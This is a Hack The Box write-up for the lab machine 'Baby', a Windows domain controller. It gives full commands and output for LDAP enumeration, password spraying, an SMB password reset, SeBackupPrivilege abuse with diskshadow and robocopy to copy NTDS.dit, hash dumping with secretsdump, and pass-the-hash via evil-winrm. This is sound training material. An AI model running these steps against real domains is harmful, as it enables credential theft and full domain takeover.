---
title: "Hack The Box: Baby"
date: 2025-11-19
summary: "An Easy Windows-based machine where the target is compromised by discovering plaintext default credentials exposed in LDAP user descriptions. Domain-wide password spraying reveals a user account flagged with STATUS_PASSWORD_MUST_CHANGE, which is reset over SMB to enable WinRM access. Privileges are then escalated by leveraging SeBackupPrivilege via diskshadow and robocopy to extract the NTDS.dit database and SYSTEM registry hive, dumping domain administrator NTLM hashes for full control."
platform: "Hack The Box"
type: "Offensive Machine"
os: "Windows"
difficulty: "Easy"
link: "https://app.hackthebox.com/machines/Baby"
tags:
  - active-directory
  - credentials-in-descriptions
  - diskshadow
  - evil-winrm
  - impacket-secretsdump
  - ldap-enumeration
  - netexec
  - nmap
  - ntds-dit
  - password-spraying
  - reg
  - robocopy
  - sam
  - sebackupprivilege
  - shadow-copy
  - smbpasswd
  - unix2dos
  - web
---

### Nmap Scan

```bash
$ nmap -sCV -vv -oA nmap/top-tcp 10.129.2.219
Nmap scan report for 10.129.2.219
Host is up, received echo-reply ttl 127 (0.20s latency).
Scanned at 2025-11-19 11:08:19 +04 for 105s
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-19 03:09:08Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2025-11-19T03:10:02+00:00; -3h59m58s from scanner time.
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Issuer: commonName=BabyDC.baby.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-18T12:14:43
| Not valid after:  2026-02-17T12:14:43
| MD5:   0321:bf6e:5491:db70:a414:9f0b:3b10:4b00
| SHA-1: f1dd:7df6:4984:95af:6ca2:e50e:0fda:e11a:a84d:cda5
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
| rdp-ntlm-info:
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-19T03:09:20+00:00
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 35026/tcp): CLEAN (Timeout)
|   Check 2 (port 18483/tcp): CLEAN (Timeout)
|   Check 3 (port 43810/udp): CLEAN (Timeout)
|   Check 4 (port 44425/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: -3h59m58s, deviation: 0s, median: -3h59m58s
| smb2-time:
|   date: 2025-11-19T03:09:23
|_  start_date: N/A
<SNIP>
```

Running services indicate that the target is a Domain Controller.

### Enumerating SMB

Let’s start by checking if SMB authentication is allowed with null or guest credentials:

```bash
$ netexec smb 10.129.2.219 -u '' -p ''
SMB         10.129.2.219    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.129.2.219    445    BABYDC           [+] baby.vl\:
```

Null authentication is allowed. Let’s create a hosts file to append to `/etc/hosts`:

```bash
$ netexec smb 10.129.2.219 -u '' -p '' --generate-hosts-file hosts
SMB         10.129.2.219    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.129.2.219    445    BABYDC           [+] baby.vl\:

$ cat hosts | sudo tee -a /etc/hosts
10.129.2.219     BABYDC.baby.vl baby.vl BABYDC
```

Now let’s enumerate SMB shares:

```bash
$ netexec smb BABYDC.baby.vl -u '' -p '' --shares
SMB         10.129.2.219    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.129.2.219    445    BABYDC           [+] baby.vl\:
SMB         10.129.2.219    445    BABYDC           [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

Not allowed.

### Enumerating LDAP

Let’s switch to LDAP enumeration and dump all objects’ data:

```bash
$ netexec ldap BABYDC.baby.vl -u '' -p '' --query "(objectClass=*)" ""
LDAP        10.129.2.219    389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.129.2.219    389    BABYDC           [+] baby.vl\:
<SNIP>
LDAP        10.129.2.219    389    BABYDC           [+] Response for object: CN=Teresa Bell,OU=it,DC=baby,DC=vl
LDAP        10.129.2.219    389    BABYDC           objectClass          top
LDAP        10.129.2.219    389    BABYDC                                person
LDAP        10.129.2.219    389    BABYDC                                organizationalPerson
LDAP        10.129.2.219    389    BABYDC                                user
LDAP        10.129.2.219    389    BABYDC           cn                   Teresa Bell
LDAP        10.129.2.219    389    BABYDC           sn                   Bell
LDAP        10.129.2.219    389    BABYDC           description          Set initial password to Baby<REDACTED>
LDAP        10.129.2.219    389    BABYDC           givenName            Teresa
LDAP        10.129.2.219    389    BABYDC           distinguishedName    CN=Teresa Bell,OU=it,DC=baby,DC=vl
LDAP        10.129.2.219    389    BABYDC           instanceType         4
LDAP        10.129.2.219    389    BABYDC           whenCreated          20211121151108.0Z
LDAP        10.129.2.219    389    BABYDC           whenChanged          20211121151437.0Z
LDAP        10.129.2.219    389    BABYDC           displayName          Teresa Bell
LDAP        10.129.2.219    389    BABYDC           uSNCreated           12889
LDAP        10.129.2.219    389    BABYDC           memberOf             CN=it,CN=Users,DC=baby,DC=vl
LDAP        10.129.2.219    389    BABYDC           uSNChanged           12905
LDAP        10.129.2.219    389    BABYDC           name                 Teresa Bell
LDAP        10.129.2.219    389    BABYDC           objectGUID           1031975b-8263-804a-bbf8-6bb21c1bb741
LDAP        10.129.2.219    389    BABYDC           userAccountControl   66080
LDAP        10.129.2.219    389    BABYDC           badPwdCount          9
LDAP        10.129.2.219    389    BABYDC           codePage             0
LDAP        10.129.2.219    389    BABYDC           countryCode          0
LDAP        10.129.2.219    389    BABYDC           badPasswordTime      134079966544252597
LDAP        10.129.2.219    389    BABYDC           lastLogoff           0
LDAP        10.129.2.219    389    BABYDC           lastLogon            0
LDAP        10.129.2.219    389    BABYDC           pwdLastSet           132819812778759642
LDAP        10.129.2.219    389    BABYDC           primaryGroupID       513
LDAP        10.129.2.219    389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-1114
LDAP        10.129.2.219    389    BABYDC           accountExpires       9223372036854775807
LDAP        10.129.2.219    389    BABYDC           logonCount           0
LDAP        10.129.2.219    389    BABYDC           sAMAccountName       Teresa.Bell
LDAP        10.129.2.219    389    BABYDC           sAMAccountType       805306368
LDAP        10.129.2.219    389    BABYDC           userPrincipalName    Teresa.Bell@baby.vl
LDAP        10.129.2.219    389    BABYDC           objectCategory       CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.2.219    389    BABYDC           dSCorePropagationData 20211121163014.0Z
LDAP        10.129.2.219    389    BABYDC                                20211121162927.0Z
LDAP        10.129.2.219    389    BABYDC                                16010101000416.0Z
LDAP        10.129.2.219    389    BABYDC           msDS-SupportedEncryptionTypes 0
<SNIP>
```

That was a large dump. A notable output is the default password found in the description of Teresa.Bell.

Let's check whether that password is valid for this user:

```bash
$ netexec smb BABYDC.baby.vl -u Teresa.Bell -p 'Baby<REDACTED>'
SMB         10.129.2.219    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.129.2.219    445    BABYDC           [-] baby.vl\Teresa.Bell:Baby<REDACTED> STATUS_LOGON_FAILURE
```

It isn’t.

### Spraying the Password

However, since this appears to be a default password, let’s spray it in the domain.

First, we need to enumerate domain usernames, which can be done with the same previous command with grepping for “Response for”:

```bash
$ netexec ldap BABYDC.baby.vl -u '' -p '' --query "(objectClass=*)" "" | grep 'Response for'
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Administrator,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Guest,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=krbtgt,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Domain Computers,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Schema Admins,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Domain Admins,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Domain Users,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Domain Guests,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Protected Users,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Key Admins,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=dev,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Hugh George,OU=dev,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Ian Walker,OU=dev,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=it,CN=Users,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Teresa Bell,OU=it,DC=baby,DC=vl
LDAP                     10.129.2.219    389    BABYDC           [+] Response for object: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
```

Let’s do some bash-fu to filter for the names, and since the sAMAccountName of the user Teresa Bell was in the format of `first.last`, let’s put the names in this format as well:

```bash
$ netexec ldap BABYDC.baby.vl -u '' -p '' --query "(objectClass=*)" "" | grep 'Response for' | cut -d '=' -f 2 | cut -d ',' -f 1 | tr ' ' '.'
baby
Administrator
Guest
krbtgt
Domain.Computers
Domain.Controllers
Schema.Admins
Enterprise.Admins
Cert.Publishers
Domain.Admins
Domain.Users
Domain.Guests
Group.Policy.Creator.Owners
RAS.and.IAS.Servers
Allowed.RODC.Password.Replication.Group
Denied.RODC.Password.Replication.Group
Read-only.Domain.Controllers
Enterprise.Read-only.Domain.Controllers
Cloneable.Domain.Controllers
Protected.Users
Key.Admins
Enterprise.Key.Admins
DnsAdmins
DnsUpdateProxy
dev
Jacqueline.Barnett
Ashley.Webb
Hugh.George
Leonard.Dyer
Ian.Walker
it
Connor.Wilkinson
Joseph.Hughes
Kerry.Wilson
Teresa.Bell
Caroline.Robinson
```

Let’s put these in a file and remove the group names.

Now let’s spray the domain against the found password:

```bash
$ netexec smb BABYDC.baby.vl -u usernames.txt -p 'Baby<REDACTED>' --continue-on-success
SMB         10.129.2.219    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.129.2.219    445    BABYDC           [-] baby.vl\Administrator:Baby<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.2.219    445    BABYDC           [-] baby.vl\Guest:Baby<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.2.219    445    BABYDC           [-] baby.vl\Jacqueline.Barnett:Baby<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.2.219    445    BABYDC           [-] baby.vl\Ashley.Webb:Baby<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.2.219    445    BABYDC           [-] baby.vl\Hugh.George:Baby<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.2.219    445    BABYDC           [-] baby.vl\Leonard.Dyer:Baby<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.2.219    445    BABYDC           [-] baby.vl\Ian.Walker:Baby<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.2.219    445    BABYDC           [-] baby.vl\Connor.Wilkinson:Baby<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.2.219    445    BABYDC           [-] baby.vl\Joseph.Hughes:Baby<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.2.219    445    BABYDC           [-] baby.vl\Kerry.Wilson:Baby<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.2.219    445    BABYDC           [-] baby.vl\Teresa.Bell:Baby<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.2.219    445    BABYDC           [-] baby.vl\Caroline.Robinson:Baby<REDACTED> STATUS_PASSWORD_MUST_CHANGE
```

All users failed to authenticate except Caroline, whose login does not succeed but instead indicates that the password must be changed.

### Resetting Caroline’s Password

Let’s change its password using `smbpasswd`:

```bash
$ smbpasswd -U caroline.robinson -r baby.vl
Old SMB password: Baby<REDACTED>
New SMB password: password1234%
Retype new SMB password: password1234%
Password changed for user caroline.robinson
```

Let’s verify the change:

```bash
$ netexec smb BABYDC.baby.vl -u caroline.robinson -p 'password1234%'
SMB         10.129.2.147    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.129.2.147    445    BABYDC           [+] baby.vl\caroline.robinson:password1234%
```

Nice.

### RCE as Caroline

Let’s check if the user can WinRM:

```bash
$ netexec winrm BABYDC.baby.vl -u caroline.robinson -p 'password1234%'
WINRM       10.129.2.147    5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
WINRM       10.129.2.147    5985   BABYDC           [+] baby.vl\caroline.robinson:password1234% (Pwn3d!)
```

Perfect, it can.

Let’s use `evil-winrm` to grab that `user.txt` flag:

```bash
$ evil-winrm -i babydc.baby.vl -u caroline.robinson -p 'password1234%'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> ls

    Directory: C:\Users\Caroline.Robinson\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/19/2025   4:57 AM             34 user.txt

*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> cat user.txt
0c3b95<REDACTED>
```

### Abusing `SeBackupPrivilege` to Extract Hashes from SAM → Fail

As part of post-exploitation enumeration, it can be seen that Caroline has `SeBackupPrivilege`:

```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> whoami /all

USER INFORMATION
----------------

User Name              SID
====================== ==============================================
baby\caroline.robinson S-1-5-21-1407081343-4001094062-1444647654-1115

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
BABY\it                                    Group            S-1-5-21-1407081343-4001094062-1444647654-1109 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
<SNIP>
```

This means that Caroline can backup files that otherwise require special permissions to do so.

Let’s save the SAM and SYSTEM hives and use them to extract the local Administrator’s hash.

First, let’s save the SAM and SYSTEM hives:

```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> reg.exe save hklm\system C:\system.save
The operation completed successfully.
```

Next, let’s download the files to Linux using `evil-winrm` download feature:

Finally, let’s use `impacket-secretsdump` to dump the hashes from the hives:

```bash
$ impacket-secretsdump -sam sam.save -system system.save local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992f<REDACTED>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

Let’s verify the hash against WinRM:

```bash
$ netexec winrm BABYDC.baby.vl -u Administrator -H 8d992f<REDACTED>
WINRM       10.129.2.147    5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
WINRM       10.129.2.147    5985   BABYDC           [-] baby.vl\Administrator:8d992f<REDACTED>
```

It failed. Time for plan B.

### Abusing `SeBackupPrivilege` to Extract Hashes from NTDS → Success

Let’s backup the `NTDS.dit` file, transfer it to Linux, and extract all hashes from it.

First, let’s create a shadow copy of the drive (because normal copying of `NTDS.dit` isn’t allowed), through the following script saved as `script.txt` (you can save it on Linux and upload it to the target):

```bash
set verbose on
set context persistent nowriters
set metadata C:\Windows\Temp\test.cab
add volume c: alias cdrive
create
expose %cdrive% e:
```

We should also make it suitable with Windows before uploading it:

```bash
$ unix2dos script.txt
unix2dos: converting file script.txt to DOS format...
```

Now let’s use it to create a shadow copy on Windows:

```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> diskshadow /s ./script.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  11/19/2025 5:26:19 AM

-> set verbose on
-> set context persistent nowriters
-> set metadata C:\Windows\Temp\test.cab
-> add volume c: alias cdrive
-> create

Alias cdrive for shadow ID {d3be6be2-3327-4199-a42d-29e431803430} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {5df14b1f-324b-4129-a245-2a8c009ee3fe} set as environment variable.
Inserted file Manifest.xml into .cab file test.cab
Inserted file DisBB4D.tmp into .cab file test.cab

Querying all shadow copies with the shadow copy set ID {5df14b1f-324b-4129-a245-2a8c009ee3fe}

        * Shadow copy ID = {d3be6be2-3327-4199-a42d-29e431803430}               %cdrive%
                - Shadow copy set: {5df14b1f-324b-4129-a245-2a8c009ee3fe}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{711fc68a-0000-0000-0000-100000000000}\ [C:\]
                - Creation time: 11/19/2025 5:26:19 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
                - Originating machine: BabyDC.baby.vl
                - Service machine: BabyDC.baby.vl
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %cdrive% e:
-> %cdrive% = {d3be6be2-3327-4199-a42d-29e431803430}
The shadow copy was successfully exposed as e:\.
->
```

Nice. Let’s verify the copy:

```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> ls E:\

    Directory: E:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         8/19/2021   6:24 AM                EFI
d-----         4/16/2025   9:17 AM                inetpub
d-----          5/8/2021   8:20 AM                PerfLogs
d-r---         4/16/2025   8:35 AM                Program Files
d-----         4/16/2025   9:38 AM                Program Files (x86)
d-r---         7/27/2024  10:27 PM                Users
d-----         8/20/2025   9:07 AM                Windows
-a----        11/19/2025   5:08 AM          49152 sam.save
-a----        11/19/2025   5:08 AM       20480000 system.save
```

Very nice.

Let’s first extract the file with `robocopy`:

```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> robocopy /b E:\Windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Wednesday, November 19, 2025 5:34:05 AM
   Source : E:\Windows\ntds\
     Dest : C:\Users\Caroline.Robinson\Documents\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    E:\Windows\ntds\
            New File              16.0 m        ntds.dit
<SNIP>
```

Now let’s download the `NTDS.dit` file from this copy to Linux:

```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> download ntds.dit

Info: Downloading C:\Users\Caroline.Robinson\Documents\ntds.dit to ntds.dit

Info: Download successful!
```

And finally let’s extract the secrets from it using `impacket-secretsdump`:

```bash
$ impacket-secretsdump -ntds ntds.dit -system system.save local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

<SNIP>
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457<REDACTED>:::
<SNIP>
[*] Cleaning up...
```

### RCE as Administrator

Let’s verify the Administrator’s hash against WinRM:

```bash
$ netexec winrm BABYDC.baby.vl -u Administrator -H ee4457<REDACTED>
WINRM       10.129.2.147    5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
WINRM       10.129.2.147    5985   BABYDC           [+] baby.vl\Administrator:ee4457<REDACTED> (Pwn3d!)
```

Perfect.

Now with the new Administrator’s hash in hand, we can use `evil-winrm` where `root.txt` will be awaiting:

```bash
$ evil-winrm -i BABYDC.baby.vl -u Administrator -H ee4457<REDACTED>

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/19/2025   4:57 AM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
e4e30a<REDACTED>
```
